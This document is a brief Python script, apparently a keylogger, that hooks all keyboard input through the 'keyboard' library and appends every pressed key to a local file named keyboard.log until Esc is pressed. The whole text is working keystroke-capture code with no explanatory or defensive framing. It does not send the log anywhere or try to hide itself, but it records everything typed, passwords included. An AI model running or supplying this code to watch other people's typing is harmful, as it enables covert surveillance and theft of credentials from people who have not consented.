from functools import partial
import os, keyboard

EXIT_KEY = "esc"

def managerFunction(LogFile, event):
    if event.event_type in ("up", "down"):
        if event.event_type == "up":
            return
        pulsation = event.name
        if event.name == "enter":
            pulsation = '\n' + pulsation + '\n'
        LogFile.write(pulsation)
        LogFile.flush()

def main():
    logFile = 'keyboard.log'
    handlerFile = open(logFile, 'a')
    keyboard.hook(partial(managerFunction, handlerFile))
    keyboard.wait(EXIT_KEY)
    handlerFile.close()


if __name__ == "__main__":
    main()